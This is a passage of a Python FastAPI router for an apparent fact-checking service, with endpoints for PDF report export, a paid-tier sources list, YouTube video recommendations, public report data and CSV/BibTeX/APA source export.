        template = jinja_env.get_template("pdf/fact_check_report.html")
        html_content = template.render(
            check=check,
            claims=claims_with_evidence,
            total_evidence=total_evidence,
            total_elements=total_elements,
            tier_counts=tier_counts,
            type_counts=type_counts,
            font_face_css=FONT_FACE_CSS,
            report_identity=report_identity,
            verify_url=verify_url,
            now=datetime.now(timezone.utc),
        )
    except Exception as e:
        logger.error(f"Template rendering failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to generate PDF template")

    # Generate PDF with WeasyPrint (lazy import — GTK3 DLLs only needed at PDF time)
    try:
        import weasyprint

        pdf_bytes = weasyprint.HTML(
            string=html_content,
            url_fetcher=_block_pdf_network_fetch,
        ).write_pdf()
    except Exception as e:
        logger.error(f"PDF generation failed: {e}")
        raise HTTPException(
            status_code=500, detail="Failed to generate PDF. Please try again."
        )

    return pdf_bytes


@router.get("/{check_id}/export/pdf", summary="Export check as PDF")
async def export_check_pdf(
    check_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Export fact-check as PDF report"""

    # Fetch check with user verification
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    if check.status != "completed":
        raise HTTPException(
            status_code=400, detail="PDF export only available for completed checks"
        )

    pdf_bytes = await _build_check_pdf_bytes(check, session)

    # Return PDF as downloadable file
    filename = f"tru8-report-{check_id[:8]}.pdf"
    return Response(
        content=pdf_bytes,
        media_type="application/pdf",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Cache-Control": "no-cache",
        },
    )


@router.get(
    "/public/{check_id}/export/pdf", summary="Export public check as PDF (no auth)"
)
async def export_public_check_pdf(
    check_id: str,
    session: AsyncSession = Depends(get_session),
):
    """Export a completed check as PDF. Public, no auth.

    Mirrors GET /public/{check_id}: any completed check is publicly viewable by
    id (no user verification). The PDF template never renders the raw input
    prompt (F-SEC-06).
    """
    stmt = select(Check).where(Check.id == check_id)
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check or check.status != "completed":
        raise HTTPException(status_code=404, detail="Check not found or not completed")

    pdf_bytes = await _build_check_pdf_bytes(check, session)

    filename = f"tru8-report-{check_id[:8]}.pdf"
    return Response(
        content=pdf_bytes,
        media_type="application/pdf",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Cache-Control": "no-cache",
        },
    )


# ============================================================================
# FULL SOURCES LIST - Pro Feature
# ============================================================================


@router.get(
    "/{check_id}/sources",
    summary="Get all reviewed sources",
    responses={
        200: {
            "description": "All sources reviewed with filter breakdown (Pro feature)",
            "model": SourcesResponse,
        },
        403: {"description": "Pro subscription required", "model": ErrorResponse},
        404: {"description": "Check not found", "model": ErrorResponse},
    },
)
async def get_check_sources(
    check_id: str,
    include_filtered: bool = True,
    sort_by: str = "relevance",  # relevance, date
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Get all sources reviewed during evidence research (Pro feature).

    Returns every source the pipeline considered, including those excluded
    by filtering. Each excluded source shows which pipeline stage removed it
    and why — full transparency into the curation process.

    **Query params:**
    - `include_filtered` — include filtered-out sources (default: true)
    - `sort_by` — sort order: 'relevance' or 'date'
    """

    # 1. Verify check belongs to user
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    # 2. Check paid subscription status
    sub_stmt = select(Subscription).where(
        Subscription.user_id == current_user["id"],
        Subscription.status.in_(["active", "trialing"]),
    )
    sub_result = await session.execute(sub_stmt)
    subscription = sub_result.scalar_one_or_none()

    is_paid = subscription and subscription.plan in (
        "starter",
        "professional",
        "pro",
        "developer",
    )

    if not is_paid:
        # Return limited response for free users
        return {
            "checkId": check_id,
            "totalSources": check.raw_sources_count or 0,
            "includedCount": 0,
            "filteredCount": 0,
            "legacyCheck": check.raw_sources_count is None
            or check.raw_sources_count == 0,
            "message": "Upgrade your plan to see all sources reviewed during analysis",
            "claims": None,
            "filterBreakdown": None,
            "requiresUpgrade": True,
        }

    # 3. Query RawEvidence for this check
    raw_stmt = select(RawEvidence).where(RawEvidence.check_id == check_id)

    if not include_filtered:
        raw_stmt = raw_stmt.where(RawEvidence.is_included == True)

    # Apply sorting
    if sort_by == "date":
        raw_stmt = raw_stmt.order_by(desc(RawEvidence.published_date))
    else:  # relevance (default)
        raw_stmt = raw_stmt.order_by(desc(RawEvidence.relevance_score))

    raw_result = await session.execute(raw_stmt)
    raw_evidence = raw_result.scalars().all()

    # Check for legacy check (no raw evidence stored)
    if not raw_evidence and (
        check.raw_sources_count is None or check.raw_sources_count == 0
    ):
        return {
            "checkId": check_id,
            "totalSources": 0,
            "includedCount": 0,
            "filteredCount": 0,
            "legacyCheck": True,
            "message": "Source data not available for checks created before this feature.",
            "claims": None,
            "filterBreakdown": None,
        }

    # 4. Group sources by claim
    claims_dict = {}
    filter_breakdown = {
        "temporal": 0,
        "dedup": 0,
        "diversity": 0,
        "domain_cap": 0,
        "validation": 0,
        "extraction_failed": 0,
    }

    included_count = 0
    filtered_count = 0

    for raw_ev in raw_evidence:
        claim_pos = raw_ev.claim_position
        if claim_pos not in claims_dict:
            claims_dict[claim_pos] = {
                "claimPosition": claim_pos,
                "claimText": raw_ev.claim_text,
                "sourcesCount": 0,
                "sources": [],
            }

        source_data = {
            "id": raw_ev.id,
            "source": raw_ev.source,
            "title": raw_ev.title,
            "url": raw_ev.url,
            "publishedDate": (
                raw_ev.published_date.isoformat() if raw_ev.published_date else None
            ),
            "relevanceScore": raw_ev.relevance_score,
            "tier": raw_ev.tier,
            "isIncluded": raw_ev.is_included,
            "filterStage": raw_ev.filter_stage,
            "filterReason": raw_ev.filter_reason,
            "isFactcheck": raw_ev.is_factcheck,
            "externalSourceProvider": raw_ev.external_source_provider,
        }

        claims_dict[claim_pos]["sources"].append(source_data)
        claims_dict[claim_pos]["sourcesCount"] += 1

        if raw_ev.is_included:
            included_count += 1
        else:
            filtered_count += 1
            # Count by filter stage
            stage = raw_ev.filter_stage or "unknown"
            if stage in filter_breakdown:
                filter_breakdown[stage] += 1

    # Convert to sorted list
    claims_list = sorted(claims_dict.values(), key=lambda c: c["claimPosition"])

    return {
        "checkId": check_id,
        "totalSources": len(raw_evidence),
        "includedCount": included_count,
        "filteredCount": filtered_count,
        "legacyCheck": False,
        "claims": claims_list,
        "filterBreakdown": filter_breakdown,
    }


# ============================================================================
# VIDEO RECOMMENDATIONS (E14)
# ============================================================================


@router.get(
    "/{check_id}/videos",
    summary="Get video recommendations",
    responses={
        200: {"description": "Video recommendations", "model": VideosResponse},
        404: {"description": "Check not found", "model": ErrorResponse},
        403: {"description": "Not authorised", "model": ErrorResponse},
    },
)
async def get_check_videos(
    check_id: str,
    claim_id: Optional[str] = None,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Get YouTube video recommendations for a check or specific claim.

    Videos are retrieved during the pipeline from YouTube Data API and
    classified with tier/type labels.

    **Query params:**
    - `claim_id` — filter to videos for a specific claim
    """
    from app.models.video_recommendation import VideoRecommendation

    # Verify ownership
    stmt = select(Check).where(Check.id == check_id)
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()
    if not check:
        raise HTTPException(status_code=404, detail="Check not found")
    if check.user_id != current_user["id"]:
        raise HTTPException(status_code=403, detail="Not authorized")

    # Query videos
    query = select(VideoRecommendation).where(VideoRecommendation.check_id == check_id)
    if claim_id:
        query = query.where(VideoRecommendation.claim_id == claim_id)

    videos_result = await session.execute(query)
    videos = videos_result.scalars().all()

    return {
        "checkId": check_id,
        "videos": [
            {
                "id": v.id,
                "claimId": v.claim_id,
                "videoId": v.video_id,
                "title": v.title,
                "description": v.description,
                "channelName": v.channel_name,
                "channelId": v.channel_id,
                "publishDate": (v.publish_date.isoformat() if v.publish_date else None),
                "videoUrl": v.video_url,
                "thumbnailUrl": v.thumbnail_url,
                "duration": v.duration,
                "tierLabel": v.tier_label,
                "typeLabel": v.type_label,
            }
            for v in videos
        ],
    }


def _video_to_dict(v) -> dict:
    return {
        "id": v.id,
        "claimId": v.claim_id,
        "videoId": v.video_id,
        "title": v.title,
        "description": v.description,
        "channelName": v.channel_name,
        "channelId": v.channel_id,
        "publishDate": (v.publish_date.isoformat() if v.publish_date else None),
        "videoUrl": v.video_url,
        "thumbnailUrl": v.thumbnail_url,
        "duration": v.duration,
        "tierLabel": v.tier_label,
        "typeLabel": v.type_label,
    }


@router.post(
    "/{check_id}/videos/recover",
    summary="Recover missing video recommendations",
    responses={
        200: {"description": "Video recommendations", "model": VideosResponse},
        404: {"description": "Check not found", "model": ErrorResponse},
        403: {"description": "Not authorised", "model": ErrorResponse},
    },
)
async def recover_check_videos(
    check_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Owner-only, idempotent on-demand recovery for videos that the
    fire-and-forget generation task lost (e.g. an API restart during its short
    window). Returns existing videos untouched if any exist; otherwise
    generates them durably (awaited, in-request, so it survives) for a
    completed check and returns them.
    """
    from app.models.video_recommendation import VideoRecommendation
    from app.services.video_recommendations import fetch_video_recommendations

    check = (
        await session.execute(select(Check).where(Check.id == check_id))
    ).scalar_one_or_none()
    if not check:
        raise HTTPException(status_code=404, detail="Check not found")
    if check.user_id != current_user["id"]:
        raise HTTPException(status_code=403, detail="Not authorized")

    # Idempotent: never regenerate over an existing set.
    existing = (
        (
            await session.execute(
                select(VideoRecommendation).where(
                    VideoRecommendation.check_id == check_id
                )
            )
        )
        .scalars()
        .all()
    )
    if existing:
        return {"checkId": check_id, "videos": [_video_to_dict(v) for v in existing]}

    # Only a finished check can have videos.
    if check.status != "completed":
        return {"checkId": check_id, "videos": []}

    # Durable generation — awaited in-request, so unlike the fire-and-forget
    # task it can't be orphaned by a restart.
    claims = (
        (
            await session.execute(
                select(Claim)
                .where(Claim.check_id == check_id)
                .where(Claim.is_selected == True)
            )
        )
        .scalars()
        .all()
    )
    if not claims:
        claims = (
            (await session.execute(select(Claim).where(Claim.check_id == check_id)))
            .scalars()
            .all()
        )
    claims_for_videos = [{"id": c.id, "text": c.text} for c in claims]
    if claims_for_videos:
        await fetch_video_recommendations(check_id, claims_for_videos)

    videos = (
        (
            await session.execute(
                select(VideoRecommendation).where(
                    VideoRecommendation.check_id == check_id
                )
            )
        )
        .scalars()
        .all()
    )
    return {"checkId": check_id, "videos": [_video_to_dict(v) for v in videos]}


# ============================================================================
# PUBLIC ENDPOINT - For OG Image Generation (no auth required)
# ============================================================================


# A sentence ends at . ! ? followed by whitespace and a capital/digit/quote —
# but not when the full stop closes a single-letter initial ("U.S. rate").
_SENTENCE_END = re.compile(r"(?<![A-Z]\.)(?<=[.!?])\s+(?=[A-Z0-9\"'(\[])")


def text_check_title(article_excerpt: str, claim_texts: list[str]) -> str:
    """Title for a check whose input was text, not a URL.

    2026-09-04: this used to be the excerpt's first ``.``-delimited fragment
    cut at 70 characters plus ``...`` — so the public record's H1, browser
    tab, share text and OG card all carried a truncated claim ("...people
    queuing on ...") while the full text sat one block below. Founder: whole
    title or none. The title is never stored; it is derived on every request,
    so this changes every record at once.

    A single-claim check IS its claim: use the claim text whole. Otherwise use
    the excerpt's first sentence, whole, split on a real sentence boundary
    (``3.4%`` and ``U.S.`` no longer end the title).
    """
    excerpt = (article_excerpt or "").strip()
    if len(claim_texts) == 1 and (claim_texts[0] or "").strip():
        return claim_texts[0].strip()
    if not excerpt:
        return ""
    return _SENTENCE_END.split(excerpt, maxsplit=1)[0].strip()


@router.get(
    "/public/{check_id}",
    summary="Get public check data (no auth)",
    responses={
        200: {
            "description": "Public check data (minimal or detailed)",
            "model": PublicCheckMinimal,
        },
        404: {
            "description": "Check not found or not completed",
            "model": ErrorResponse,
        },
    },
)
async def get_public_check(
    check_id: str, detailed: bool = False, session: AsyncSession = Depends(get_session)
):
    """Get public check data. No authentication required.

    **Query params:**
    - `detailed=false` (default) — minimal data for OG card generation
    - `detailed=true` — full check data for the public report page,
      including claims, evidence, and video recommendations

    Only returns completed checks.
    """
    # Get check from database (no user verification - public endpoint)
    stmt = select(Check).where(Check.id == check_id)
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    if check.status != "completed":
        raise HTTPException(status_code=404, detail="Check not found or not completed")

    # Get claims for this check
    claims_stmt = (
        select(Claim).where(Claim.check_id == check_id).order_by(Claim.position)
    )
    claims_result = await session.execute(claims_stmt)
    claims = claims_result.scalars().all()

    # Get all evidence for this check to calculate stats
    all_evidence = []
    top_sources_set = set()

    for claim in claims:
        evidence_stmt = (
            select(Evidence)
            .where(Evidence.claim_id == claim.id)
            .order_by(desc(Evidence.relevance_score))
        )
        evidence_result = await session.execute(evidence_stmt)
        evidence_list = evidence_result.scalars().all()
        all_evidence.extend(evidence_list)

        # Collect unique sources
        for ev in evidence_list:
            if ev.source:
                top_sources_set.add(ev.source)

    # Extract source domain and title from URL
    source_domain = None
    title = None

    if check.input_url:
        try:
            from urllib.parse import urlparse
            import re

            parsed = urlparse(check.input_url)
            source_domain = parsed.netloc.replace("www.", "")

            # Extract title from URL slug (last path segment)
            path_parts = [p for p in parsed.path.split("/") if p and len(p) > 3]
            if path_parts:
                slug = path_parts[-1]
                # Remove file extensions
                slug = re.sub(r"\.\w+$", "", slug)
                # Remove trailing IDs (various patterns: -b2895946, -12345678, _abc123)
                slug = re.sub(r"[-_][a-zA-Z]?\d{5,}$", "", slug)  # -b2895946, -12345678
                slug = re.sub(r"[-_]\d+$", "", slug)  # Trailing numbers
                slug = re.sub(
                    r"[-_][a-f0-9]{8,}$", "", slug, flags=re.IGNORECASE
                )  # UUIDs/hashes
                # Convert slug to title case
                title = slug.replace("-", " ").replace("_", " ").title()
        except Exception:
            pass

    # Fallback title options
    if not title or len(title) < 10:
        if check.article_excerpt:
            title = text_check_title(check.article_excerpt, [c.text for c in claims])
        elif source_domain:
            title = f"Report from {source_domain}"

    # Minimal response for OG card generation
    base_response = {
        "id": check.id,
        "title": title,
        "sourceUrl": check.input_url,
        "sourceDomain": source_domain,
        "claimsCount": len(claims),
        "sourcesCount": check.raw_sources_count or len(top_sources_set),
        "totalSearchResults": check.total_search_results
        or check.raw_sources_count
        or len(top_sources_set),
        "evidenceCount": len(all_evidence),
        "entryMode": check.entry_mode,
        "selectedClaimsCount": check.selected_claims_count,
        "topSources": list(top_sources_set)[:5],
    }

    # If not detailed, return minimal response for OG card
    if not detailed:
        return base_response

    # Build detailed response for public report page
    # Build claims with evidence
    claims_data = []
    snapshot_rows = []
    for claim in claims:
        # Get evidence for this claim
        evidence_stmt = (
            select(Evidence)
            .where(Evidence.claim_id == claim.id)
            .order_by(desc(Evidence.relevance_score))
        )
        evidence_result = await session.execute(evidence_stmt)
        evidence_list = evidence_result.scalars().all()

        evidence_data = [
            _serialize_evidence(ev, include_factcheck_detail=True)
            for ev in evidence_list
        ]
        snapshot_rows.append((claim, evidence_list))

        claim_map = (
            _claim_map_to_camel_case(claim.claim_map) if claim.claim_map else None
        )
        claims_data.append(
            {
                "id": claim.id,
                "text": claim.text,
                "position": claim.position,
                "claimMap": claim_map,
                "claimType": claim.claim_type,
                "isSelected": claim.is_selected,
                "isTimeSensitive": claim.is_time_sensitive,
                "timeReference": claim.time_reference,
                "evidence": evidence_data,
            }
        )

    from app.services.report_revisions import snapshot_from_rows, identify_snapshot

    report_identity = await identify_snapshot(
        session, snapshot_from_rows(check, snapshot_rows)
    )

    # Fetch video recommendations for public report
    from app.models.video_recommendation import VideoRecommendation

    videos_stmt = select(VideoRecommendation).where(
        VideoRecommendation.check_id == check_id
    )
    videos_result = await session.execute(videos_stmt)
    videos = videos_result.scalars().all()

    return {
        **base_response,
        # Full check metadata
        # F-SEC-06: inputContent is intentionally stripped from public report
        # responses. The raw submitted JSON (text/url/file_path) may contain
        # PII or sensitive claim text — public reports must only expose the
        # analysis output, not the original prompt. Opt-in is_public flag is
        # post-launch work. inputUrl is retained because URLs are less
        # sensitive than free-text claims.
        "inputType": check.input_type,
        "inputUrl": check.input_url,
        "articleExcerpt": check.article_excerpt,
        "articleDomain": check.article_domain,
        "articleJurisdiction": check.article_jurisdiction,
        "createdAt": check.created_at.isoformat() if check.created_at else None,
        "completedAt": check.completed_at.isoformat() if check.completed_at else None,
        # Full claims with evidence
        "claims": claims_data,
        "reportIdentity": report_identity,
        # Video recommendations
        "videos": [
            {
                "id": v.id,
                "claimId": v.claim_id,
                "videoId": v.video_id,
                "title": v.title,
                "description": v.description,
                "channelName": v.channel_name,
                "channelId": v.channel_id,
                "publishDate": (v.publish_date.isoformat() if v.publish_date else None),
                "videoUrl": v.video_url,
                "thumbnailUrl": v.thumbnail_url,
                "duration": v.duration,
                "tierLabel": v.tier_label,
                "typeLabel": v.type_label,
            }
            for v in videos
        ],
    }


@router.get(
    "/public/{check_id}/videos",
    summary="Get video recommendations (public, no auth)",
)
async def get_public_check_videos(
    check_id: str,
    claim_id: Optional[str] = None,
    session: AsyncSession = Depends(get_session),
):
    """Public video recommendations for a check.

    Mirrors the authenticated `/{check_id}/videos` endpoint without the
    ownership gate — public reports already expose the full check (claims,
    evidence, videos) by id, and videos are public YouTube links (no PII).
    Lets the public report re-poll for videos that the fire-and-forget task
    writes ~1s after the check completes (after the cached page first renders).
    """
    from app.models.video_recommendation import VideoRecommendation

    query = select(VideoRecommendation).where(VideoRecommendation.check_id == check_id)
    if claim_id:
        query = query.where(VideoRecommendation.claim_id == claim_id)
    videos = (await session.execute(query)).scalars().all()
    return {
        "checkId": check_id,
        "videos": [
            {
                "id": v.id,
                "claimId": v.claim_id,
                "videoId": v.video_id,
                "title": v.title,
                "description": v.description,
                "channelName": v.channel_name,
                "channelId": v.channel_id,
                "publishDate": (v.publish_date.isoformat() if v.publish_date else None),
                "videoUrl": v.video_url,
                "thumbnailUrl": v.thumbnail_url,
                "duration": v.duration,
                "tierLabel": v.tier_label,
                "typeLabel": v.type_label,
            }
            for v in videos
        ],
    }


@router.get("/{check_id}/sources/export", summary="Export sources as CSV/BibTeX/APA")
async def export_check_sources(
    check_id: str,
    format: str = "csv",  # csv, bibtex, apa
    include_filtered: bool = False,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Export sources as CSV, BibTeX, or APA format (Pro feature).

    Query params:
    - format: Export format - csv, bibtex, or apa
    - include_filtered: Include filtered sources (default: false)
    """
    import csv
    from io import StringIO

    # 1. Verify check belongs to user
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    # 2. Check paid subscription status
    sub_stmt = select(Subscription).where(
        Subscription.user_id == current_user["id"],
        Subscription.status.in_(["active", "trialing"]),
    )
    sub_result = await session.execute(sub_stmt)
    subscription = sub_result.scalar_one_or_none()

    is_paid = subscription and subscription.plan in (
        "starter",
        "professional",
        "pro",
        "developer",
    )

    if not is_paid:
        raise HTTPException(
            status_code=403,
            detail="Source export requires a paid plan. Upgrade to access.",
        )

    # 3. Query RawEvidence
    raw_stmt = select(RawEvidence).where(RawEvidence.check_id == check_id)

    if not include_filtered:
        raw_stmt = raw_stmt.where(RawEvidence.is_included == True)

    raw_stmt = raw_stmt.order_by(
        RawEvidence.claim_position, desc(RawEvidence.relevance_score)
    )

    raw_result = await session.execute(raw_stmt)
    raw_evidence = raw_result.scalars().all()

    if not raw_evidence:
        raise HTTPException(status_code=404, detail="No sources available for export")

    # 4. Generate export based on format
    # NOTE: We intentionally exclude internal scoring metrics (relevance_score,
    # filter_stage, filter_reason) from exports.
    if format == "csv":
        output = StringIO()
        writer = csv.writer(output)
        writer.writerow(
            ["Claim", "Source", "Title", "URL", "Published Date", "Used in Analysis"]
        )

        for ev in raw_evidence:
            writer.writerow(
                [
                    ev.claim_text or "",
                    ev.source,
                    ev.title,
                    ev.url,
                    ev.published_date.strftime("%Y-%m-%d") if ev.published_date else "",
                    "Yes" if ev.is_included else "No",
                ]
            )

        content = output.getvalue()
        media_type = "text/csv"
        filename = f"tru8-sources-{check_id[:8]}.csv"

    elif format == "bibtex":
        lines = []
        for i, ev in enumerate(raw_evidence):
            # Generate a unique key for each entry
            key = f"tru8_{check_id[:8]}_{i+1}"
            pub_year = ev.published_date.year if ev.published_date else "n.d."
            pub_month = ev.published_date.strftime("%B") if ev.published_date else ""
            pub_day = ev.published_date.day if ev.published_date else ""

            # Standard BibTeX @online entry (no internal scoring)
            entry = f"""@online{{{key},
    title = {{{ev.title}}},
    author = {{{{{ev.source}}}}},
    year = {{{pub_year}}},
    month = {{{pub_month.lower()}}},
    url = {{{ev.url}}},
    urldate = {{{datetime.now().strftime("%Y-%m-%d")}}}
}}"""
            lines.append(entry)

        content = "\n\n".join(lines)
        media_type = "application/x-bibtex"
        filename = f"tru8-sources-{check_id[:8]}.bib"

    elif format == "apa":
        lines = []
        for ev in raw_evidence:
            # APA 7th edition format for web pages
            pub_date = (
                ev.published_date.strftime("%Y, %B %d") if ev.published_date else "n.d."
            )
            entry = f"{ev.source}. ({pub_date}). {ev.title}. Retrieved from {ev.url}"
            lines.append(entry)

        content = "\n\n".join(lines)
        media_type = "text/plain"
        filename = f"tru8-sources-{check_id[:8]}-apa.txt"

    else:
        raise HTTPException(
            status_code=400, detail="Invalid format. Supported: csv, bibtex, apa"
        )

    return Response(
        content=content,
        media_type=media_type,
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Cache-Control": "no-cache",
        },
    )
